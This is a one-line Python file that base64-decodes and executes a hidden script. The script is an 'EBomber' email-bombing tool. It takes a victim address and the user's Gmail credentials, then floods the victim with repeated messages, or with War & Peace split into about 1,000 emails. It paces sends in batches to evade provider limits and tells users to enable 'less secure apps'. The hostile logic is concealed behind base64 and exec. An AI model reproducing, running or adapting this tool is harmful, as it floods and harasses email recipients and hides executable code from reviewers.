import base64; exec(base64.b64decode('aW1wb3J0IHB5ZmlnbGV0DQppbXBvcnQgdGltZQ0KZnJvbSB0ZXJtY29sb3IgaW1wb3J0IGNvbG9yZWQNCmltcG9ydCB3ZWJicm93c2VyDQppbXBvcnQgc210cGxpYg0KDQojIyMjIyMjIyMjIyMjIyMjIyN0ZXh0cyMjIyMjIyMjIyMjIyMjIyMjIyMjDQpwcmludChjb2xvcmVkKHB5ZmlnbGV0LmZpZ2xldF9mb3JtYXQoIkVCb21iZXIiLGp1c3RpZnk9ImNlbnRlciIpLCAiZ3JlZW4iKSkNCnRpbWUuc2xlZXAoMSkNCnByaW50KGNvbG9yZWQocHlmaWdsZXQuZmlnbGV0X2Zvcm1hdCgiVGVhbSBDLkEuVCIpLCAicmVkIikpDQp0aW1lLnNsZWVwKDAuNSkNCiAgICAjIyMjIyMjIyMjIyMjIyMjIyMjI2lucHV0cyMNCnByaW50KCIgICAgICAgICAgICAgICIpDQoNCnVzZXJuYW1lID0gaW5wdXQoY29sb3JlZCgiRW50ZXIgeW91ciBuYW1lIG9yIHNraXAgYnkgcHJzc2luZyBlbnRlciA6ICIsICJ5ZWxsb3ciKSkNCnByaW50KCIgICAgICAgICAgICAgICIpDQpwcmludCgiICAgICAgICAgIidIaScsIHVzZXJuYW1lLCAnd2VsY29tZSB0byBFQm9tYmVyJykNCnByaW50KCIgICAgICAgICAgICAgICIpDQp0aW1lLnNsZWVwKDAuNSkNCnByaW50KGNvbG9yZWQoIiAgICAgICAgICIgJ1sxXS5TdHJhdCBBdHRhY2snLCAicmVkIikpDQp0aW1lLnNsZWVwKDAuNSkNCnByaW50KGNvbG9yZWQoIiAgICAgICAgICIgJ1syXS5Db21tZW50IGEgYnVnJywgInJlZCIpKQ0KdGltZS5zbGVlcCgwLjUpDQpwcmludChjb2xvcmVkKCIgICAgICAgICAiICdbM10uQWJvdXQgdXMnLCAicmVkIikpDQpwcmludCgiICAgICAgICAgICAgICAiKQ0KdGltZS5zbGVlcCgwLjUpDQogICAgDQpjaG9pY2UgPSBpbnB1dChjb2xvcmVkKCJFbnRlciB5b3VyIGNob2ljZSAoZW50ZXIgbnVtYmVyKTogIiwgInllbGxvdyIpKQ0KDQppZiBjaG9pY2UgPT0gIjEiOg0KICAgIHByaW50KCIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIikNCiAgICBjaG9pY2UyID0gaW5wdXQoY29sb3JlZCgiVXNlIHlvdXIgbWFzc2VnZSBmb3IgZW1haWxbMV0gLCB1c2UgdG9vbCBwb3dlciBmdWxsIG1hc3NlZ2UgWzJdICAoZW50ZXIgbnVtYmVyKTogIiAsICJ5ZWxsb3ciKSkNCiAgICBpZiBjaG9pY2UyID09ICIxIjoNCiAgICAgICAgd2ViYnJvd3Nlci5vcGVuKCJ3d3cuZ29vZ2xlLmNvbSIpDQogICAgICAgIHByaW50KGNvbG9yZWQoIlBsZWFzZSB3YXRjaCBvcGVuZCB2aWRlbyBvbiB3ZWIgYnJvd3NlciBpZiB5b3Ugbm90IHdhdGNoZWQgdGhhdCB5b3UgY2FudCBydW4gdG9vbCBub3QgZ29pbmcgZW1haWxzLi4uLi4uLiA6ICIsICJyZWQiKSkNCiAgICAgICAgcHJpbnQoIiAgICAgICAgICAgICAgICAgICIpDQogICAgICAgICAgICANCiAgICAgICAgcHJpbnQoY29sb3JlZCgiUGxlYXNlIHJlbWViZXIgdHVybiBvbiBsZXNzIHNlY3VyZSBhcHBzIGluIHlvdXIgZ29vZ2xlIGFjb3VudCAgLi4uLi4uLiAgIiwgInJlZCIpKSAgIA0KICAgICAgICBwcmludCgiICAgICAgICAgICAgICAgICAgIikgDQogICAgICAgIGxpc3QgPSBbXQ0KICAgICAgICBwcmludCgiICAgICAgICAgICAgICAgICAgIikNCiAgICAgICAgbGlzdC5pbnNlcnQoMCAsIGlucHV0KGNvbG9yZWQoIkVudGVyIFN1YmplY3Q6ICIsInllbGxvdyIpKSkNCiAgICAgICAgICAgICAgICANCiAgICAgICAgcHJpbnQoIiAgICAgICAgICAgICAgICAgICIpDQogICAgICAgICAgICAgICAgDQogICAgICAgIGxpc3QuaW5zZXJ0KDEgLCBpbnB1dChjb2xvcmVkKCJFbnRlciBCb2R5OiAiICwgInllbGxvdyIpKSkNCiAgICAgICAgICAgICAgICANCiAgICAgICAgcHJpbnQoIiAgICAgICAgICAgICAgICAgICIpDQogICAgICAgICAgICAgICAgDQogICAgICAgIGxpc3QuaW5zZXJ0KDIgLCBpbnB1dChjb2xvcmVkKCJFbnRlciB2aXRlbSBlbWFpbDogIiAsICJ5ZWxsb3ciKSkpDQogICAgICAgICAgICAgICAgDQogICAgICAgIHByaW50KCIgICAgICAgICAgICAgICAgICAiKQ0KICAgICAgICAgICAgICAgIA0KICAgICAgICBsaXN0Lmluc2VydCgzICwgaW5wdXQoY29sb3JlZCgiRW50ZXIgeW91ciBlbWFpbDogIiAsICJ5ZWxsb3ciKSkpDQogICAgICAgICAgICAgICAgDQogICAgICAgIHByaW50KCIgICAgICAgICAgICAgICAgICAiKQ0KICAgICAgICAgICAgICAgIA0KICAgICAgICBsaXN0Lmluc2VydCg0ICwgaW5wdXQoY29sb3JlZCgiRW50ZXIgeW91ciBlbWFpbCdzIHBhc3N3b3JkOiAiICwgInllbGxvdyIpKSkNCiAgICAgICAgICAgICAgICANCiAgICAgICAgcHJpbnQoIiAgICAgICAgICAgICAgICAgICIpDQogICAgICAgICAgICAgICAgDQogICAgICAgIHduID0gaW5wdXQoY29sb3JlZCgibWFzc2VnZSBjb3VudCB5b3Ugd2FudCBzZW5kOiAiICwgInllbGxvdyIpKQ0KICAgICAgICB3bmkgPSBpbnQod24pDQogICAgICAgIHByaW50KCIgICAgICAgICAgICAgICAgICAiKQ0KICAgICAgICAgICAgICAgIA0KICAgICAgICBjb3VudCA9IDENCiAgICAgICAgd2hpbGUgY291bnQgPD0gd25pOg0KICAgICAgICAgICAgeCA9IGxpc3RbMF0NCiAgICAgICAgICAgIHkgPSBsaXN0WzFdDQogICAgICAgICAgICB6ID0gbGlzdFsyXQ0KICAgICAgICAgICAgdiA9IGxpc3RbM10NCiAgICAgICAgICAgIGNjID0gbGlzdFs0XQ0KDQogICAgICAgICAgICBtZXNzYWdlID0gJ1N1YmplY3Q6IHt9XG5cbnt9Jy5mb3JtYXQoeCwgeSkNCiAgICAgICAgICAgIHNlcnZlciA9IHNtdHBsaWIuU01UUF9TU0woInNtdHAuZ21haWwuY29tIiAsIDQ2NSkNCiAgICAgICAgICAgIHNlcnZlci5sb2dpbih2ICwgY2MpDQogICAgICAgICAgICBzZXJ2ZXIuc2VuZG1haWwodiAsIHogLCBtZXNzYWdlKQ0KICAgICAgICAgICAgcHJpbnQoIlNlbnQgc3VjY2VzICIgLCBjb3VudCkNCiAgICAgICAgICAgIGNvdW50ICs9MQ0KICAgIGlmIGNob2ljZTIgPT0gIjIiOg0KICAgICAgICB3ZWJicm93c2VyLm9wZW4oInd3dy5nb29nbGUuY29tIikNCiAgICAgICAgcHJpbnQoY29sb3JlZCgiUGxlYXNlIHdhdGNoIG9wZW5kIHZpZGVvIG9uIHdlYiBicm93c2VyIGlmIHlvdSBub3Qgd2F0Y2hlZCB0aGF0IHlvdSBjYW50IHJ1biB0b29sIG5vdCBnb2luZyBlbWFpbHMuLi4uLi4uIDogIiwgInJlZCIpKQ0KICAgICAgICBwcmludCgiICAgICAgICAgICAgICAgICAgIikNCiAgICAgICAgICAgIA0KICAgICAgICBwcmludChjb2xvcmVkKCJQbGVhc2UgcmVtZWJlciB0dXJuIG9uIGxlc3Mgc2VjdXJlIGFwcHMgaW4geW91ciBnb29nbGUgYWNvdW50IC4uLi4uLi4gIiwgInJlZCIpKSAgDQoNCiAgICAgICAgcHJpbnQoIiAgICAgICAgICAgICAgICAgICIpDQogICAgICAgIA0KICAgICAgICAgICAgICAgIA0KICAgICAgICB2dnZ2ID0gaW5wdXQoY29sb3JlZCgiRW50ZXIgdml0ZW0gZW1haWw6ICIgLCAieWVsbG93IikpDQogICAgICAgICAgICAgICAgDQogICAgICAgIHByaW50KCIgICAgICAgICAgICAgICAgICAiKQ0KICAgICAgICAgICAgICAgIA0KICAgICAgICB5eXl5ID0gaW5wdXQoY29sb3JlZCgiRW50ZXIgeW91ciBlbWFpbDogIiAsICJ5ZWxsb3ciKSkNCiAgICAgICAgICAgICAgICANCiAgICAgICAgcHJpbnQoIiAgICAgICAgICAgICAgICAgICIpDQogICAgICAgICAgICAgICAgDQogICAgICAgIHBwcHBwID0gaW5wdXQoY29sb3JlZCgiRW50ZXIgeW91ciBlbWFpbCdzIHBhc3N3b3JkOiAiICwgInllbGxvdyIpKQ0KICAgICAgICAjIFByb2plY3QgTGlicmFyaWVzDQogICAgICAgICMgdXNlZCB0byBnZXQgYm9vayBkYXRhIGZyb20gd2Vic2l0ZQ0KICAgICAgICBpbXBvcnQgcmVxdWVzdHMgDQogICAgICAgICMgdXNlZCB0byBjYWxjdWxhdGUgd29yZHMgcGVyIG1lc3NhZ2UNCiAgICAgICAgZnJvbSBtYXRoIGltcG9ydCBmbG9vciANCiAgICAgICAgIyB1c2VkIHRvIGNyZWF0ZSBkZWxheSBpbiBsb29wDQogICAgICAgIGltcG9ydCB0aW1lIA0KICAgICAgICAjIHVzZWQgZm9yIHNlbmRpbmcgdGhlIGVtYWlsDQogICAgICAgIGltcG9ydCBzbXRwbGliICBhcyBzbXRwIA0KICAgICAgICAjIHVzZWQgdG8gYnVpbGQgdGhlIGVtYWlsDQogICAgICAgIGZyb20gZW1haWwubWVzc2FnZSBpbXBvcnQgRW1haWxNZXNzYWdlIA0KDQoNCiAgICAgICAgIyBpbXBvcnQgdGhlIGJvb2sgZGF0YSBmb3IgKipXYXIgJiBQZWFjZSoqDQogICAgICAgICMgU2VuZCBhIHJlcXVlc3QgdG8gZG93bmxvYWQgdGhlIGJvb2sgZnJvbSB0aGUgR3V0ZW5iZXJnIGxpYnJhcnkgd2Vic2l0ZQ0KICAgICAgICBib29rX3VybCA9ICdodHRwczovL3d3dy5ndXRlbmJlcmcub3JnL2ZpbGVzLzI2MDAvMjYwMC0wLnR4dCcNCiAgICAgICAgciA9IHJlcXVlc3RzLmdldChib29rX3VybCkNCg0KICAgICAgICAjIFJlbW92ZSBhIGZldyBhc2NpaSBjaGFyYWN0ZXJzIHRoYXQgYXJlIGNhdXNpbmcgcHJvYmxlbXMgaW4gdGhlIGRlY29kaW5nIHByb2Nlc3MuIFNpbmNlIHRoaXMganVzdCANCiAgICAgICAgIyBhIGhhY2stZW1haWwsIEkgZG8gbm90IG5lZWQgdGhlIGRlY29kaW5nIHRvIGJlIDEwMCUgY29ycmVjdCBmb3IgZXZlcnkgc2luZ2xlIGNoYXJhY3Rlci4NCiAgICAgICAgYm9va19kYXRhID0gci50ZXh0LmVuY29kZSgnYXNjaWknLCAnaWdub3JlJykuZGVjb2RlKCdhc2NpaScpDQoNCiAgICAgICAgIyBTcGxpdCB0aGUgd29yZHMgb2YgZWFjaCBib29rIGludG8gYSBsaXN0IG9mIHdvcmRzDQogICAgICAgIHdvcmRfbGlzdCA9IGJvb2tfZGF0YS5zcGxpdCgiICIpDQoNCiAgICAgICAgIyBEZXRlcm1pbmUgdGhlIG1lc3NhZ2Ugc2l6ZSBvZiBlYWNoIGVtYWlsLCBhbmQgdGhlbiB0aGUgc2l6ZSBvZiB0aGUgcmVzaWR1YWwgZW1haWwNCiAgICAgICAgbXNnX3NpemUgPSBmbG9vcihsZW4od29yZF9saXN0KSAvIDEwMDApDQogICAgICAgIGZpbmFsX21zZ19zaXplID0gbGVuKHdvcmRfbGlzdCkgLSAobXNnX3NpemUgKiA5OTkpDQogICAgICAgIHByaW50KGYiV29yZHMgcGVyIG1lc3NhZ2U6IHttc2dfc2l6ZX1cbkZpbmFsIG1lc3NhZ2Ugc2l6ZToge2ZpbmFsX21zZ19zaXplfSIpDQoNCiAgICAgICAgIyMgc2V0dXAgc2VydmVyIGF1dGhlbnRpY2F0aW9uIHZhcmlhYmxlcw0KICAgICAgICAnJycNCiAgICAgICAgICAgIFRoZXNlIHZhcmlhYmxlcyB3aWxsIGJlIHVzZWQgdG8gY3JlYXRlIHRoZSBlbWFpbCBzZXJ2ZXIgY29ubmVjdGlvbiBhbmQgZnJvbSwgdG8gaGVhZGVycy4gWW91ciANCiAgICAgICAgICAgIHVzZXJuYW1lIG1heSBiZSBkaWZmZXJlbnQgZnJvbSB5b3VyIGVtYWlsIGFkZHJlc3MsIGJ1dCBwcm9iYWJseSBub3QuICANCiAgICAgICAgICAgIFNNVFAgc2VydmVycyB0aGF0IEkndmUgdXNlZCBpbmNsdWRlOiANCiAgICAgICAgICAgIC0gc210cC5nbWFpbC5jb20gKHBvcnQgNTg3KQ0KICAgICAgICAgICAgLSBzbXRwLm9mZmljZTM2NS5jb20gKHBvcnQgNTg3KQ0KICAgICAgICAgICAgLSBzbXRwLm1haWwueWFob28uY29tIChwb3J0IDU4NyBvciA0NjUpDQogICAgICAgICcnJw0KICAgICAgICB1c2VyID0geXl5eQ0KICAgICAgICBwYXNzd29yZCA9IHBwcHBwDQogICAgICAgIGZyX2FkZHJlc3MgPSB5eXl5DQogICAgICAgIHRvX2FkZHJlc3MgPSB2dnZ2DQogICAgICAgIHNtdHBfaG9zdCA9ICdzbXRwLmdtYWlsLmNvbScgDQogICAgICAgIHNtdHBfcG9ydCA9IDU4Nw0KDQogICAgICAgICMgc2V0dXAgZW1haWwgdmFyaWFibGVzDQogICAgICAgIHN1YmplY3QgPSAnV2FyICYgUGVhY2UgLSBQYXJ0ICcNCiAgICAgICAgbXNnX3RleHQgPSAnJw0KICAgICAgICBzdGFydF9wb3MgPSAwDQogICAgICAgIG1zZ19jb3VudCA9IDANCg0KICAgICAgICAjIGNyZWF0ZSBhbmQgc2VuZCBlbWFpbA0KICAgICAgICAnJycgT3BlbiBhIGNvbm5lY3Rpb24gdG8gdGhlIGVtYWlsIHNlcnZlciwgdGhlbiBjcmVhdGUgYW5kIHNlbmQgdGhlIGVtYWlsIG1lc3NhZ2UgaW4gc2VwYXJhdGUgaW50byANCiAgICAgICAgICAgIGNodW5rcyBvZiA1MCBlbWFpbHMgaW4gb3JkZXIgdG8gYXZvaWQgc2VuZGluZyBsaW1pdHMgJycnDQogICAgICAgIGZvciBiIGluIHJhbmdlKDIwKToNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgIyBvcGVuIHRoZSBlbWFpbCBzZXJ2ZXIgY29ubmVjdGlvbg0KICAgICAgICAgICAgc2VydmVyID0gc210cC5TTVRQKGhvc3Q9c210cF9ob3N0LCBwb3J0PXNtdHBfcG9ydCkNCiAgICAgICAgICAgIHNlcnZlci5zdGFydHRscygpDQogICAgICAgICAgICBzZXJ2ZXIubG9naW4odXNlcj11c2VyLCBwYXNzd29yZD1wYXNzd29yZCkNCg0KICAgICAgICAgICAgIyBjcmVhdGUgYW5kIHNlbmQgdGhlIG1lc3NhZ2UNCiAgICAgICAgICAgIGZvciBpIGluIHJhbmdlKDUwKToNCiAgICAgICAgICAgICAgICAjIGNoZWNrIHRvIHNlZSBpZiB0aGlzIGlzIHRoZSBmaW5hbCBtZXNzYWdlLCB3aGljaCBoYXMgYSBzbGlnaHRseSBkaWZmZXJlbnQgcmFuZ2UNCiAgICAgICAgICAgICAgICBpZiBtc2dfY291bnQgPT0gMTAwMDoNCiAgICAgICAgICAgICAgICAgICAgc3RhcnRfcG9zID0gKGxlbih3b3JkX2xpc3QpLWZpbmFsX21zZ19zaXplKQ0KICAgICAgICAgICAgICAgICAgICBtc2dfdGV4dCA9ICcgJy5qb2luKHdvcmRfbGlzdFtzdGFydF9wb3M6XSkNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICBzdGFydF9wb3MgPSBtc2dfY291bnQgKiBtc2dfc2l6ZQ0KICAgICAgICAgICAgICAgICAgICBtc2dfdGV4dCA9ICcgJy5qb2luKHdvcmRfbGlzdFtzdGFydF9wb3M6c3RhcnRfcG9zICsgbXNnX3NpemVdKQ0KDQogICAgICAgICAgICAgICAgIyBjcmVhdGUgdGhlIGVtYWlsIG1lc3NhZ2UgaGVhZGVycyBhbmQgc2V0IHRoZSBwYXlsb2FkDQogICAgICAgICAgICAgICAgbXNnID0gRW1haWxNZXNzYWdlKCkNCiAgICAgICAgICAgICAgICBtc2dbJ0Zyb20nXSA9IGZyX2FkZHJlc3MNCiAgICAgICAgICAgICAgICBtc2dbJ1RvJ10gPSB0b19hZGRyZXNzDQogICAgICAgICAgICAgICAgbXNnWydTdWJqZWN0J10gPSBzdWJqZWN0ICsgc3RyKG1zZ19jb3VudCsxKQ0KICAgICAgICAgICAgICAgIG1zZy5zZXRfcGF5bG9hZChtc2dfdGV4dCkNCg0KICAgICAgICAgICAgICAgIG1zZ19jb3VudCArPSAxDQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgIyBvcGVuIHRoZSBlbWFpbCBzZXJ2ZXIgYW5kIHNlbmQgdGhlIG1lc3NhZ2UNCiAgICAgICAgICAgICAgICBzZXJ2ZXIuc2VuZF9tZXNzYWdlKG1zZykNCg0KICAgICAgICAgICAgICAgICcnJyBkZWxheSBlYWNoIGVtYWlsIGJ5IDEvMiBzZWNvbmQgdG8gc3BhY2Ugb3V0IHRoZSBkaXN0cmlidXRpb24NCiAgICAgICAgICAgICAgICAgICAgdGhpcyAxLzIgc2Vjb25kIGRlbGF5IG1heSBjYXVzZSB0aGUgZW1haWxzIHRvIGJlIGRlbGl2ZXJlZCBvdXQtb2Ytb3JkZXINCiAgICAgICAgICAgICAgICAgICAgd2hlbiBzb21lIGFyZSBzbGlnaHRseSBsYXJnZXIgdGhhbiBvdGhlcnMuDQogICAgICAgICAgICAgICAgJycnDQogICAgICAgICAgICAgICAgdGltZS5zbGVlcCgwLjUpDQogICAgICAgICAgICANCiAgICAgICAgICAgICMgZGVsYXkgZWFjaCBiYXRjaCBieSA2MCBzZWNvbmRzIHRvIGF2b2lkIHNlbmRpbmcgbGltaXRzDQogICAgICAgICAgICB0aW1lLnNsZWVwKDYwKQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBzZXJ2ZXIuY2xvc2UoKQ0KDQoNCg0KZWxpZiBjaG9pY2UgPT0gIjIiOg0KICAgIHByaW50KCJub3QgYXZhbGlibGUgcmlnaHQgbm93IikNCmVsaWYgY2hvaWNlID09ICIzIjoNCiAgICBwcmludCgibm90IGF2YWxpYmxlIHJpZ2h0IG5vdyIpDQplbHNlOg0KICAgIHByaW50KCJXcm9uZyBpbnB1dCIpDQogICAgZXhpdCgpDQogICAgdGltZS5zbGVlcCgwLjUp'))